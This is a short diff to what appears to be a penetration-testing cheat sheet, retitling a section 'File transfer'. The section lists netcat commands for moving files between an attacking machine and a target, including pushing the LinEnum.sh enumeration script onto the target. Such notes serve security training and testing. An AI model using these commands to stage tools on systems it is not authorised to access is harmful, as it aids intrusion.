@@ -1,4 +1,4 @@
-# index
+# File transfer
 
 **Netcat \[nc\]** `nc -w 3 <target_ip> 1234 < LinEnum.sh` on target machine: `nc -l -p 1234 > LinEnum.sh` `nc IP_ADDR PORT > OUTFILE` \(run `nc -lvp PORT < infile` on attacking machine\)
 
